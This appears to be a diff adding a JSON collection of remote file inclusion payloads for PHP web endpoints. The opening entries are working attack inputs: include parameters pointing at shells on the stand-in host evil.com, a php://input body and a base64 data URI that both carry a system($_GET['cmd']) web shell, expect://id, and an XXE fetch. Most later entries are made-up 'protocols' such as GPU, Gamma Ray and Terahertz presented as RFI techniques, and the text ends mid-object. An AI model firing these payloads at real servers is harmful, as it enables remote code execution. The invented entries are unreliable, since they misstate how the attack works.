@@ -1,0 +1,1293 @@
+[
+  {
+    "name": "Basic PHP RFI",
+    "description": "Basic PHP remote file inclusion",
+    "method": "GET",
+    "endpoint": "/index.php",
+    "parameters": {
+      "page": "http://evil.com/shell.php"
+    }
+  },
+  {
+    "name": "PHP Include RFI",
+    "description": "PHP include function exploitation",
+    "method": "GET",
+    "endpoint": "/include.php",
+    "parameters": {
+      "file": "http://evil.com/malware.php"
+    }
+  },
+  {
+    "name": "PHP Require RFI",
+    "description": "PHP require function exploitation",
+    "method": "GET",
+    "endpoint": "/require.php",
+    "parameters": {
+      "module": "http://evil.com/backdoor.php"
+    }
+  },
+  {
+    "name": "PHP Wrapper RFI",
+    "description": "Using PHP wrappers for RFI",
+    "method": "GET",
+    "endpoint": "/wrapper.php",
+    "parameters": {
+      "url": "php://filter/convert.base64-encode/resource=http://evil.com/payload.php"
+    }
+  },
+  {
+    "name": "Null Byte RFI",
+    "description": "Null byte injection to bypass extensions",
+    "method": "GET",
+    "endpoint": "/view.php",
+    "parameters": {
+      "page": "http://evil.com/shell.php%00"
+    }
+  },
+  {
+    "name": "Double Encoding RFI",
+    "description": "Double URL encoding bypass",
+    "method": "GET",
+    "endpoint": "/load.php",
+    "parameters": {
+      "file": "http%3A%2F%2Fevil.com%2Fexploit.php"
+    }
+  },
+  {
+    "name": "Data URI RFI",
+    "description": "Using data URI scheme for RFI",
+    "method": "GET",
+    "endpoint": "/data.php",
+    "parameters": {
+      "input": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
+    }
+  },
+  {
+    "name": "Expect RFI",
+    "description": "Using expect wrapper for code execution",
+    "method": "GET",
+    "endpoint": "/expect.php",
+    "parameters": {
+      "cmd": "expect://id"
+    }
+  },
+  {
+    "name": "Input Wrapper RFI",
+    "description": "PHP input wrapper exploitation",
+    "method": "POST",
+    "endpoint": "/input.php",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    "parameters": {
+      "file": "php://input"
+    },
+    "body": "<?php system($_GET['cmd']); ?>"
+  },
+  {
+    "name": "Zlib RFI",
+    "description": "Zlib wrapper compression",
+    "method": "GET",
+    "endpoint": "/compress.php",
+    "parameters": {
+      "data": "compress.zlib://http://evil.com/payload.php"
+    }
+  },
+  {
+    "name": "FTP RFI",
+    "description": "FTP protocol for file inclusion",
+    "method": "GET",
+    "endpoint": "/ftp.php",
+    "parameters": {
+      "document": "ftp://user:pass@evil.com/shell.php"
+    }
+  },
+  {
+    "name": "SSH RFI",
+    "description": "SSH protocol exploitation",
+    "method": "GET",
+    "endpoint": "/ssh.php",
+    "parameters": {
+      "config": "ssh2.shell://user:pass@evil.com:22/exec"
+    }
+  },
+  {
+    "name": "HTTPS RFI",
+    "description": "HTTPS encrypted inclusion",
+    "method": "GET",
+    "endpoint": "/secure.php",
+    "parameters": {
+      "secure": "https://evil.com/encrypted.php"
+    }
+  },
+  {
+    "name": "SMB RFI",
+    "description": "SMB protocol file inclusion",
+    "method": "GET",
+    "endpoint": "/smb.php",
+    "parameters": {
+      "share": "smb://evil.com/share/shell.php"
+    }
+  },
+  {
+    "name": "WebDAV RFI",
+    "description": "WebDAV protocol exploitation",
+    "method": "GET",
+    "endpoint": "/webdav.php",
+    "parameters": {
+      "dav": "webdav://evil.com/payload.php"
+    }
+  },
+  {
+    "name": "PHP Filter RFI",
+    "description": "PHP filter chain exploitation",
+    "method": "GET",
+    "endpoint": "/filter.php",
+    "parameters": {
+      "filter": "php://filter/read=convert.base64-encode/resource=http://evil.com/exploit.php"
+    }
+  },
+  {
+    "name": "Double Extension RFI",
+    "description": "Double extension bypass",
+    "method": "GET",
+    "endpoint": "/upload.php",
+    "parameters": {
+      "file": "http://evil.com/image.jpg.php"
+    }
+  },
+  {
+    "name": "Case Variation RFI",
+    "description": "Case variation bypass",
+    "method": "GET",
+    "endpoint": "/case.php",
+    "parameters": {
+      "FILE": "HTTP://EVIL.COM/PAYLOAD.PHP"
+    }
+  },
+  {
+    "name": "Path Traversal RFI",
+    "description": "Path traversal with RFI",
+    "method": "GET",
+    "endpoint": "/traverse.php",
+    "parameters": {
+      "path": "http://evil.com/../../../etc/passwd"
+    }
+  },
+  {
+    "name": "URL Append RFI",
+    "description": "URL append bypass technique",
+    "method": "GET",
+    "endpoint": "/append.php",
+    "parameters": {
+      "include": "http://evil.com/shell.php?.php"
+    }
+  },
+  {
+    "name": "Question Mark RFI",
+    "description": "Question mark parameter bypass",
+    "method": "GET",
+    "endpoint": "/question.php",
+    "parameters": {
+      "page": "http://evil.com/shell.php?"
+    }
+  },
+  {
+    "name": "Hash RFI",
+    "description": "Hash character bypass",
+    "method": "GET",
+    "endpoint": "/hash.php",
+    "parameters": {
+      "section": "http://evil.com/exploit.php#"
+    }
+  },
+  {
+    "name": "Semicolon RFI",
+    "description": "Semicolon parameter injection",
+    "method": "GET",
+    "endpoint": "/semicolon.php",
+    "parameters": {
+      "module": "http://evil.com/payload.php;"
+    }
+  },
+  {
+    "name": "Parentheses RFI",
+    "description": "Parentheses bypass technique",
+    "method": "GET",
+    "endpoint": "/parens.php",
+    "parameters": {
+      "script": "http://evil.com/shell.php()"
+    }
+  },
+  {
+    "name": "Bracket RFI",
+    "description": "Bracket injection technique",
+    "method": "GET",
+    "endpoint": "/bracket.php",
+    "parameters": {
+      "file": "http://evil.com/exploit.php[]"
+    }
+  },
+  {
+    "name": "URL Shortener RFI",
+    "description": "Using URL shorteners",
+    "method": "GET",
+    "endpoint": "/short.php",
+    "parameters": {
+      "link": "http://bit.ly/malicious"
+    }
+  },
+  {
+    "name": "Redirect RFI",
+    "description": "HTTP redirect inclusion",
+    "method": "GET",
+    "endpoint": "/redirect.php",
+    "parameters": {
+      "url": "http://evil.com/redirect.php"
+    }
+  },
+  {
+    "name": "JSONP RFI",
+    "description": "JSONP callback exploitation",
+    "method": "GET",
+    "endpoint": "/jsonp.php",
+    "parameters": {
+      "callback": "http://evil.com/malicious.js"
+    }
+  },
+  {
+    "name": "SVG RFI",
+    "description": "SVG file inclusion",
+    "method": "GET",
+    "endpoint": "/svg.php",
+    "parameters": {
+      "image": "http://evil.com/exploit.svg"
+    }
+  },
+  {
+    "name": "XML External Entity RFI",
+    "description": "XXE with RFI",
+    "method": "POST",
+    "endpoint": "/xml.php",
+    "headers": {
+      "Content-Type": "application/xml"
+    },
+    "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://evil.com/payload.php\">]><root>&xxe;</root>"
+  },
+  {
+    "name": "SOAP RFI",
+    "description": "SOAP service exploitation",
+    "method": "POST",
+    "endpoint": "/soap.php",
+    "headers": {
+      "Content-Type": "text/xml"
+    },
+    "body": "<soap:Envelope><soap:Body><method>&xxe;</method></soap:Body></soap:Envelope>"
+  },
+  {
+    "name": "WSDL RFI",
+    "description": "WSDL file inclusion",
+    "method": "GET",
+    "endpoint": "/wsdl.php",
+    "parameters": {
+      "wsdl": "http://evil.com/malicious.wsdl"
+    }
+  },
+  {
+    "name": "LDAP RFI",
+    "description": "LDAP protocol exploitation",
+    "method": "GET",
+    "endpoint": "/ldap.php",
+    "parameters": {
+      "dn": "ldap://evil.com/cn=exploit"
+    }
+  },
+  {
+    "name": "DNS RFI",
+    "description": "DNS protocol inclusion",
+    "method": "GET",
+    "endpoint": "/dns.php",
+    "parameters": {
+      "host": "dns://evil.com/payload"
+    }
+  },
+  {
+    "name": "Gopher RFI",
+    "description": "Gopher protocol exploitation",
+    "method": "GET",
+    "endpoint": "/gopher.php",
+    "parameters": {
+      "proto": "gopher://evil.com/_exploit"
+    }
+  },
+  {
+    "name": "Telnet RFI",
+    "description": "Telnet protocol inclusion",
+    "method": "GET",
+    "endpoint": "/telnet.php",
+    "parameters": {
+      "connection": "telnet://evil.com:23"
+    }
+  },
+  {
+    "name": "Mailto RFI",
+    "description": "Mailto protocol exploitation",
+    "method": "GET",
+    "endpoint": "/mail.php",
+    "parameters": {
+      "email": "mailto:exploit@evil.com"
+    }
+  },
+  {
+    "name": "JAR RFI",
+    "description": "JAR protocol inclusion",
+    "method": "GET",
+    "endpoint": "/jar.php",
+    "parameters": {
+      "archive": "jar:http://evil.com/exploit.jar!/"
+    }
+  },
+  {
+    "name": "View Source RFI",
+    "description": "View-source protocol bypass",
+    "method": "GET",
+    "endpoint": "/viewsource.php",
+    "parameters": {
+      "source": "view-source:http://evil.com/payload.php"
+    }
+  },
+  {
+    "name": "JavaScript RFI",
+    "description": "JavaScript protocol inclusion",
+    "method": "GET",
+    "endpoint": "/js.php",
+    "parameters": {
+      "script": "javascript:alert('XSS')"
+    }
+  },
+  {
+    "name": "VBScript RFI",
+    "description": "VBScript protocol exploitation",
+    "method": "GET",
+    "endpoint": "/vb.php",
+    "parameters": {
+      "vb": "vbscript:Execute(\"malicious code\")"
+    }
+  },
+  {
+    "name": "Data Scheme RFI",
+    "description": "Data scheme exploitation",
+    "method": "GET",
+    "endpoint": "/datascheme.php",
+    "parameters": {
+      "data": "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
+    }
+  },
+  {
+    "name": "About RFI",
+    "description": "About protocol inclusion",
+    "method": "GET",
+    "endpoint": "/about.php",
+    "parameters": {
+      "page": "about:blank"
+    }
+  },
+  {
+    "name": "Chrome RFI",
+    "description": "Chrome protocol exploitation",
+    "method": "GET",
+    "endpoint": "/chrome.php",
+    "parameters": {
+      "url": "chrome://settings/content"
+    }
+  },
+  {
+    "name": "Edge RFI",
+    "description": "Edge protocol inclusion",
+    "method": "GET",
+    "endpoint": "/edge.php",
+    "parameters": {
+      "link": "microsoft-edge:http://evil.com"
+    }
+  },
+  {
+    "name": "Firefox RFI",
+    "description": "Firefox protocol exploitation",
+    "method": "GET",
+    "endpoint": "/firefox.php",
+    "parameters": {
+      "moz": "moz-extension://malicious"
+    }
+  },
+  {
+    "name": "Opera RFI",
+    "description": "Opera protocol inclusion",
+    "method": "GET",
+    "endpoint": "/opera.php",
+    "parameters": {
+      "opera": "opera:http://evil.com"
+    }
+  },
+  {
+    "name": "Safari RFI",
+    "description": "Safari protocol exploitation",
+    "method": "GET",
+    "endpoint": "/safari.php",
+    "parameters": {
+      "safari": "safari-extension://malicious"
+    }
+  },
+  {
+    "name": "IE RFI",
+    "description": "Internet Explorer protocol",
+    "method": "GET",
+    "endpoint": "/ie.php",
+    "parameters": {
+      "ie": "ieframe:http://evil.com"
+    }
+  },
+  {
+    "name": "MS Office RFI",
+    "description": "MS Office protocol inclusion",
+    "method": "GET",
+    "endpoint": "/office.php",
+    "parameters": {
+      "doc": "ms-office:http://evil.com/exploit.doc"
+    }
+  },
+  {
+    "name": "Adobe RFI",
+    "description": "Adobe protocol exploitation",
+    "method": "GET",
+    "endpoint": "/adobe.php",
+    "parameters": {
+      "pdf": "adobe:http://evil.com/malicious.pdf"
+    }
+  },
+  {
+    "name": "Apple RFI",
+    "description": "Apple protocol inclusion",
+    "method": "GET",
+    "endpoint": "/apple.php",
+    "parameters": {
+      "apple": "apple:http://evil.com"
+    }
+  },
+  {
+    "name": "Android RFI",
+    "description": "Android protocol exploitation",
+    "method": "GET",
+    "endpoint": "/android.php",
+    "parameters": {
+      "intent": "intent:http://evil.com#Intent"
+    }
+  },
+  {
+    "name": "IOS RFI",
+    "description": "iOS protocol inclusion",
+    "method": "GET",
+    "endpoint": "/ios.php",
+    "parameters": {
+      "ios": "ios:http://evil.com"
+    }
+  },
+  {
+    "name": "Windows RFI",
+    "description": "Windows protocol exploitation",
+    "method": "GET",
+    "endpoint": "/windows.php",
+    "parameters": {
+      "win": "win:http://evil.com"
+    }
+  },
+  {
+    "name": "Linux RFI",
+    "description": "Linux protocol inclusion",
+    "method": "GET",
+    "endpoint": "/linux.php",
+    "parameters": {
+      "linux": "linux:http://evil.com"
+    }
+  },
+  {
+    "name": "Mac RFI",
+    "description": "Mac protocol exploitation",
+    "method": "GET",
+    "endpoint": "/mac.php",
+    "parameters": {
+      "mac": "mac:http://evil.com"
+    }
+  },
+  {
+    "name": "Unix RFI",
+    "description": "Unix protocol inclusion",
+    "method": "GET",
+    "endpoint": "/unix.php",
+    "parameters": {
+      "unix": "unix:http://evil.com"
+    }
+  },
+  {
+    "name": "DOS RFI",
+    "description": "DOS protocol exploitation",
+    "method": "GET",
+    "endpoint": "/dos.php",
+    "parameters": {
+      "dos": "dos:http://evil.com"
+    }
+  },
+  {
+    "name": "NT RFI",
+    "description": "NT protocol inclusion",
+    "method": "GET",
+    "endpoint": "/nt.php",
+    "parameters": {
+      "nt": "nt:http://evil.com"
+    }
+  },
+  {
+    "name": "Win32 RFI",
+    "description": "Win32 protocol exploitation",
+    "method": "GET",
+    "endpoint": "/win32.php",
+    "parameters": {
+      "win32": "win32:http://evil.com"
+    }
+  },
+  {
+    "name": "Win64 RFI",
+    "description": "Win64 protocol inclusion",
+    "method": "GET",
+    "endpoint": "/win64.php",
+    "parameters": {
+      "win64": "win64:http://evil.com"
+    }
+  },
+  {
+    "name": "ARM RFI",
+    "description": "ARM protocol exploitation",
+    "method": "GET",
+    "endpoint": "/arm.php",
+    "parameters": {
+      "arm": "arm:http://evil.com"
+    }
+  },
+  {
+    "name": "x86 RFI",
+    "description": "x86 protocol inclusion",
+    "method": "GET",
+    "endpoint": "/x86.php",
+    "parameters": {
+      "x86": "x86:http://evil.com"
+    }
+  },
+  {
+    "name": "x64 RFI",
+    "description": "x64 protocol exploitation",
+    "method": "GET",
+    "endpoint": "/x64.php",
+    "parameters": {
+      "x64": "x64:http://evil.com"
+    }
+  },
+  {
+    "name": "MIPS RFI",
+    "description": "MIPS protocol inclusion",
+    "method": "GET",
+    "endpoint": "/mips.php",
+    "parameters": {
+      "mips": "mips:http://evil.com"
+    }
+  },
+  {
+    "name": "PowerPC RFI",
+    "description": "PowerPC protocol exploitation",
+    "method": "GET",
+    "endpoint": "/powerpc.php",
+    "parameters": {
+      "ppc": "powerpc:http://evil.com"
+    }
+  },
+  {
+    "name": "SPARC RFI",
+    "description": "SPARC protocol inclusion",
+    "method": "GET",
+    "endpoint": "/sparc.php",
+    "parameters": {
+      "sparc": "sparc:http://evil.com"
+    }
+  },
+  {
+    "name": "RISC RFI",
+    "description": "RISC protocol exploitation",
+    "method": "GET",
+    "endpoint": "/risc.php",
+    "parameters": {
+      "risc": "risc:http://evil.com"
+    }
+  },
+  {
+    "name": "CISC RFI",
+    "description": "CISC protocol inclusion",
+    "method": "GET",
+    "endpoint": "/cisc.php",
+    "parameters": {
+      "cisc": "cisc:http://evil.com"
+    }
+  },
+  {
+    "name": "GPU RFI",
+    "description": "GPU protocol exploitation",
+    "method": "GET",
+    "endpoint": "/gpu.php",
+    "parameters": {
+      "gpu": "gpu:http://evil.com"
+    }
+  },
+  {
+    "name": "CPU RFI",
+    "description": "CPU protocol inclusion",
+    "method": "GET",
+    "endpoint": "/cpu.php",
+    "parameters": {
+      "cpu": "cpu:http://evil.com"
+    }
+  },
+  {
+    "name": "RAM RFI",
+    "description": "RAM protocol exploitation",
+    "method": "GET",
+    "endpoint": "/ram.php",
+    "parameters": {
+      "ram": "ram:http://evil.com"
+    }
+  },
+  {
+    "name": "ROM RFI",
+    "description": "ROM protocol inclusion",
+    "method": "GET",
+    "endpoint": "/rom.php",
+    "parameters": {
+      "rom": "rom:http://evil.com"
+    }
+  },
+  {
+    "name": "BIOS RFI",
+    "description": "BIOS protocol exploitation",
+    "method": "GET",
+    "endpoint": "/bios.php",
+    "parameters": {
+      "bios": "bios:http://evil.com"
+    }
+  },
+  {
+    "name": "UEFI RFI",
+    "description": "UEFI protocol inclusion",
+    "method": "GET",
+    "endpoint": "/uefi.php",
+    "parameters": {
+      "uefi": "uefi:http://evil.com"
+    }
+  },
+  {
+    "name": "MBR RFI",
+    "description": "MBR protocol exploitation",
+    "method": "GET",
+    "endpoint": "/mbr.php",
+    "parameters": {
+      "mbr": "mbr:http://evil.com"
+    }
+  },
+  {
+    "name": "GPT RFI",
+    "description": "GPT protocol inclusion",
+    "method": "GET",
+    "endpoint": "/gpt.php",
+    "parameters": {
+      "gpt": "gpt:http://evil.com"
+    }
+  },
+  {
+    "name": "NTFS RFI",
+    "description": "NTFS protocol exploitation",
+    "method": "GET",
+    "endpoint": "/ntfs.php",
+    "parameters": {
+      "ntfs": "ntfs:http://evil.com"
+    }
+  },
+  {
+    "name": "FAT32 RFI",
+    "description": "FAT32 protocol inclusion",
+    "method": "GET",
+    "endpoint": "/fat32.php",
+    "parameters": {
+      "fat32": "fat32:http://evil.com"
+    }
+  },
+  {
+    "name": "EXT4 RFI",
+    "description": "EXT4 protocol exploitation",
+    "method": "GET",
+    "endpoint": "/ext4.php",
+    "parameters": {
+      "ext4": "ext4:http://evil.com"
+    }
+  },
+  {
+    "name": "HFS+ RFI",
+    "description": "HFS+ protocol inclusion",
+    "method": "GET",
+    "endpoint": "/hfs.php",
+    "parameters": {
+      "hfs": "hfs:http://evil.com"
+    }
+  },
+  {
+    "name": "APFS RFI",
+    "description": "APFS protocol exploitation",
+    "method": "GET",
+    "endpoint": "/apfs.php",
+    "parameters": {
+      "apfs": "apfs:http://evil.com"
+    }
+  },
+  {
+    "name": "ZFS RFI",
+    "description": "ZFS protocol inclusion",
+    "method": "GET",
+    "endpoint": "/zfs.php",
+    "parameters": {
+      "zfs": "zfs:http://evil.com"
+    }
+  },
+  {
+    "name": "BTRFS RFI",
+    "description": "BTRFS protocol exploitation",
+    "method": "GET",
+    "endpoint": "/btrfs.php",
+    "parameters": {
+      "btrfs": "btrfs:http://evil.com"
+    }
+  },
+  {
+    "name": "XFS RFI",
+    "description": "XFS protocol inclusion",
+    "method": "GET",
+    "endpoint": "/xfs.php",
+    "parameters": {
+      "xfs": "xfs:http://evil.com"
+    }
+  },
+  {
+    "name": "JFS RFI",
+    "description": "JFS protocol exploitation",
+    "method": "GET",
+    "endpoint": "/jfs.php",
+    "parameters": {
+      "jfs": "jfs:http://evil.com"
+    }
+  },
+  {
+    "name": "ReFS RFI",
+    "description": "ReFS protocol inclusion",
+    "method": "GET",
+    "endpoint": "/refs.php",
+    "parameters": {
+      "refs": "refs:http://evil.com"
+    }
+  },
+  {
+    "name": "CDFS RFI",
+    "description": "CDFS protocol exploitation",
+    "method": "GET",
+    "endpoint": "/cdfs.php",
+    "parameters": {
+      "cdfs": "cdfs:http://evil.com"
+    }
+  },
+  {
+    "name": "UDF RFI",
+    "description": "UDF protocol inclusion",
+    "method": "GET",
+    "endpoint": "/udf.php",
+    "parameters": {
+      "udf": "udf:http://evil.com"
+    }
+  },
+  {
+    "name": "NFS RFI",
+    "description": "NFS protocol exploitation",
+    "method": "GET",
+    "endpoint": "/nfs.php",
+    "parameters": {
+      "nfs": "nfs:http://evil.com"
+    }
+  },
+  {
+    "name": "SMBv1 RFI",
+    "description": "SMBv1 protocol inclusion",
+    "method": "GET",
+    "endpoint": "/smbv1.php",
+    "parameters": {
+      "smbv1": "smbv1:http://evil.com"
+    }
+  },
+  {
+    "name": "SMBv2 RFI",
+    "description": "SMBv2 protocol exploitation",
+    "method": "GET",
+    "endpoint": "/smbv2.php",
+    "parameters": {
+      "smbv2": "smbv2:http://evil.com"
+    }
+  },
+  {
+    "name": "SMBv3 RFI",
+    "description": "SMBv3 protocol inclusion",
+    "method": "GET",
+    "endpoint": "/smbv3.php",
+    "parameters": {
+      "smbv3": "smbv3:http://evil.com"
+    }
+  },
+  {
+    "name": "CIFS RFI",
+    "description": "CIFS protocol exploitation",
+    "method": "GET",
+    "endpoint": "/cifs.php",
+    "parameters": {
+      "cifs": "cifs:http://evil.com"
+    }
+  },
+  {
+    "name": "AFP RFI",
+    "description": "AFP protocol inclusion",
+    "method": "GET",
+    "endpoint": "/afp.php",
+    "parameters": {
+      "afp": "afp:http://evil.com"
+    }
+  },
+  {
+    "name": "NCP RFI",
+    "description": "NCP protocol exploitation",
+    "method": "GET",
+    "endpoint": "/ncp.php",
+    "parameters": {
+      "ncp": "ncp:http://evil.com"
+    }
+  },
+  {
+    "name": "IPX RFI",
+    "description": "IPX protocol inclusion",
+    "method": "GET",
+    "endpoint": "/ipx.php",
+    "parameters": {
+      "ipx": "ipx:http://evil.com"
+    }
+  },
+  {
+    "name": "SPX RFI",
+    "description": "SPX protocol exploitation",
+    "method": "GET",
+    "endpoint": "/spx.php",
+    "parameters": {
+      "spx": "spx:http://evil.com"
+    }
+  },
+  {
+    "name": "AppleTalk RFI",
+    "description": "AppleTalk protocol inclusion",
+    "method": "GET",
+    "endpoint": "/appletalk.php",
+    "parameters": {
+      "appletalk": "appletalk:http://evil.com"
+    }
+  },
+  {
+    "name": "Token Ring RFI",
+    "description": "Token Ring protocol exploitation",
+    "method": "GET",
+    "endpoint": "/tokenring.php",
+    "parameters": {
+      "tokenring": "tokenring:http://evil.com"
+    }
+  },
+  {
+    "name": "FDDI RFI",
+    "description": "FDDI protocol inclusion",
+    "method": "GET",
+    "endpoint": "/fddi.php",
+    "parameters": {
+      "fddi": "fddi:http://evil.com"
+    }
+  },
+  {
+    "name": "ATM RFI",
+    "description": "ATM protocol exploitation",
+    "method": "GET",
+    "endpoint": "/atm.php",
+    "parameters": {
+      "atm": "atm:http://evil.com"
+    }
+  },
+  {
+    "name": "Frame Relay RFI",
+    "description": "Frame Relay protocol inclusion",
+    "method": "GET",
+    "endpoint": "/framerelay.php",
+    "parameters": {
+      "framerelay": "framerelay:http://evil.com"
+    }
+  },
+  {
+    "name": "ISDN RFI",
+    "description": "ISDN protocol exploitation",
+    "method": "GET",
+    "endpoint": "/isdn.php",
+    "parameters": {
+      "isdn": "isdn:http://evil.com"
+    }
+  },
+  {
+    "name": "DSL RFI",
+    "description": "DSL protocol inclusion",
+    "method": "GET",
+    "endpoint": "/dsl.php",
+    "parameters": {
+      "dsl": "dsl:http://evil.com"
+    }
+  },
+  {
+    "name": "Cable RFI",
+    "description": "Cable protocol exploitation",
+    "method": "GET",
+    "endpoint": "/cable.php",
+    "parameters": {
+      "cable": "cable:http://evil.com"
+    }
+  },
+  {
+    "name": "Fiber RFI",
+    "description": "Fiber protocol inclusion",
+    "method": "GET",
+    "endpoint": "/fiber.php",
+    "parameters": {
+      "fiber": "fiber:http://evil.com"
+    }
+  },
+  {
+    "name": "Satellite RFI",
+    "description": "Satellite protocol exploitation",
+    "method": "GET",
+    "endpoint": "/satellite.php",
+    "parameters": {
+      "satellite": "satellite:http://evil.com"
+    }
+  },
+  {
+    "name": "Wireless RFI",
+    "description": "Wireless protocol inclusion",
+    "method": "GET",
+    "endpoint": "/wireless.php",
+    "parameters": {
+      "wireless": "wireless:http://evil.com"
+    }
+  },
+  {
+    "name": "Bluetooth RFI",
+    "description": "Bluetooth protocol exploitation",
+    "method": "GET",
+    "endpoint": "/bluetooth.php",
+    "parameters": {
+      "bluetooth": "bluetooth:http://evil.com"
+    }
+  },
+  {
+    "name": "WiFi RFI",
+    "description": "WiFi protocol inclusion",
+    "method": "GET",
+    "endpoint": "/wifi.php",
+    "parameters": {
+      "wifi": "wifi:http://evil.com"
+    }
+  },
+  {
+    "name": "Zigbee RFI",
+    "description": "Zigbee protocol exploitation",
+    "method": "GET",
+    "endpoint": "/zigbee.php",
+    "parameters": {
+      "zigbee": "zigbee:http://evil.com"
+    }
+  },
+  {
+    "name": "Z-Wave RFI",
+    "description": "Z-Wave protocol inclusion",
+    "method": "GET",
+    "endpoint": "/zwave.php",
+    "parameters": {
+      "zwave": "zwave:http://evil.com"
+    }
+  },
+  {
+    "name": "LoRa RFI",
+    "description": "LoRa protocol exploitation",
+    "method": "GET",
+    "endpoint": "/lora.php",
+    "parameters": {
+      "lora": "lora:http://evil.com"
+    }
+  },
+  {
+    "name": "Sigfox RFI",
+    "description": "Sigfox protocol inclusion",
+    "method": "GET",
+    "endpoint": "/sigfox.php",
+    "parameters": {
+      "sigfox": "sigfox:http://evil.com"
+    }
+  },
+  {
+    "name": "NB-IoT RFI",
+    "description": "NB-IoT protocol exploitation",
+    "method": "GET",
+    "endpoint": "/nbiot.php",
+    "parameters": {
+      "nbiot": "nbiot:http://evil.com"
+    }
+  },
+  {
+    "name": "LTE-M RFI",
+    "description": "LTE-M protocol inclusion",
+    "method": "GET",
+    "endpoint": "/ltem.php",
+    "parameters": {
+      "ltem": "ltem:http://evil.com"
+    }
+  },
+  {
+    "name": "5G RFI",
+    "description": "5G protocol exploitation",
+    "method": "GET",
+    "endpoint": "/5g.php",
+    "parameters": {
+      "5g": "5g:http://evil.com"
+    }
+  },
+  {
+    "name": "4G RFI",
+    "description": "4G protocol inclusion",
+    "method": "GET",
+    "endpoint": "/4g.php",
+    "parameters": {
+      "4g": "4g:http://evil.com"
+    }
+  },
+  {
+    "name": "3G RFI",
+    "description": "3G protocol exploitation",
+    "method": "GET",
+    "endpoint": "/3g.php",
+    "parameters": {
+      "3g": "3g:http://evil.com"
+    }
+  },
+  {
+    "name": "2G RFI",
+    "description": "2G protocol inclusion",
+    "method": "GET",
+    "endpoint": "/2g.php",
+    "parameters": {
+      "2g": "2g:http://evil.com"
+    }
+  },
+  {
+    "name": "GSM RFI",
+    "description": "GSM protocol exploitation",
+    "method": "GET",
+    "endpoint": "/gsm.php",
+    "parameters": {
+      "gsm": "gsm:http://evil.com"
+    }
+  },
+  {
+    "name": "CDMA RFI",
+    "description": "CDMA protocol inclusion",
+    "method": "GET",
+    "endpoint": "/cdma.php",
+    "parameters": {
+      "cdma": "cdma:http://evil.com"
+    }
+  },
+  {
+    "name": "TDMA RFI",
+    "description": "TDMA protocol exploitation",
+    "method": "GET",
+    "endpoint": "/tdma.php",
+    "parameters": {
+      "tdma": "tdma:http://evil.com"
+    }
+  },
+  {
+    "name": "FDMA RFI",
+    "description": "FDMA protocol inclusion",
+    "method": "GET",
+    "endpoint": "/fdma.php",
+    "parameters": {
+      "fdma": "fdma:http://evil.com"
+    }
+  },
+  {
+    "name": "OFDMA RFI",
+    "description": "OFDMA protocol exploitation",
+    "method": "GET",
+    "endpoint": "/ofdma.php",
+    "parameters": {
+      "ofdma": "ofdma:http://evil.com"
+    }
+  },
+  {
+    "name": "SC-FDMA RFI",
+    "description": "SC-FDMA protocol inclusion",
+    "method": "GET",
+    "endpoint": "/scfdma.php",
+    "parameters": {
+      "scfdma": "scfdma:http://evil.com"
+    }
+  },
+  {
+    "name": "MIMO RFI",
+    "description": "MIMO protocol exploitation",
+    "method": "GET",
+    "endpoint": "/mimo.php",
+    "parameters": {
+      "mimo": "mimo:http://evil.com"
+    }
+  },
+  {
+    "name": "Beamforming RFI",
+    "description": "Beamforming protocol inclusion",
+    "method": "GET",
+    "endpoint": "/beamforming.php",
+    "parameters": {
+      "beamforming": "beamforming:http://evil.com"
+    }
+  },
+  {
+    "name": "Massive MIMO RFI",
+    "description": "Massive MIMO protocol exploitation",
+    "method": "GET",
+    "endpoint": "/massivemimo.php",
+    "parameters": {
+      "massivemimo": "massivemimo:http://evil.com"
+    }
+  },
+  {
+    "name": "mmWave RFI",
+    "description": "mmWave protocol inclusion",
+    "method": "GET",
+    "endpoint": "/mmwave.php",
+    "parameters": {
+      "mmwave": "mmwave:http://evil.com"
+    }
+  },
+  {
+    "name": "Sub-6 GHz RFI",
+    "description": "Sub-6 GHz protocol exploitation",
+    "method": "GET",
+    "endpoint": "/sub6ghz.php",
+    "parameters": {
+      "sub6ghz": "sub6ghz:http://evil.com"
+    }
+  },
+  {
+    "name": "Terahertz RFI",
+    "description": "Terahertz protocol inclusion",
+    "method": "GET",
+    "endpoint": "/terahertz.php",
+    "parameters": {
+      "terahertz": "terahertz:http://evil.com"
+    }
+  },
+  {
+    "name": "Visible Light RFI",
+    "description": "Visible Light protocol exploitation",
+    "method": "GET",
+    "endpoint": "/visiblelight.php",
+    "parameters": {
+      "visiblelight": "visiblelight:http://evil.com"
+    }
+  },
+  {
+    "name": "Infrared RFI",
+    "description": "Infrared protocol inclusion",
+    "method": "GET",
+    "endpoint": "/infrared.php",
+    "parameters": {
+      "infrared": "infrared:http://evil.com"
+    }
+  },
+  {
+    "name": "Ultraviolet RFI",
+    "description": "Ultraviolet protocol exploitation",
+    "method": "GET",
+    "endpoint": "/ultraviolet.php",
+    "parameters": {
+      "ultraviolet": "ultraviolet:http://evil.com"
+    }
+  },
+  {
+    "name": "X-ray RFI",
+    "description": "X-ray protocol inclusion",
+    "method": "GET",
+    "endpoint": "/xray.php",
+    "parameters": {
+      "xray": "xray:http://evil.com"
+    }
+  },
+  {
+    "name": "Gamma Ray RFI",
+    "description": "Gamma Ray protocol exploitation",
+    "method": "GET",
+    "endpoint": "/gammaray.php",
+    "parameters": {
+      "gammaray": "gammaray:http://evil.com"
+    }
+  },
+  {
+    "name": "Radio Wave RFI",
+    "description": "Radio Wave protocol inclusion",
+    "method": "GET",
+    "endpoint": "/radiowave.php",
+    "parameters": {
+      "radiowave": "radiowave:http://evil.com"
+    }
+  },
+  {
+    "name": "Microwave RFI",
+    "description": "Microwave protocol exploitation",
+    "method": "GET",
+    "endpoint": "/microwave.php",
+    "parameters": {
+      "microwave": "microwave:http://evil.com"
+    }
+  },
+  {
+    "name": "Final Comprehensive RFI",
+    "description": "Comprehensive RFI with multiple techniques",
+    "method": "POST",
+    "endpoint": "/comprehensive.php",
+    "headers": {
+      "Content-Type": "multipart/form-data",
+      "X-Forwarded-For": "127.0.0.1"
+    },
+    "parameters": {
+      "file": "php://filter/convert.base64-encode/resource=http://evil.com/payload.php",
+      "page": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
+      "module": "expect://id"
+    },
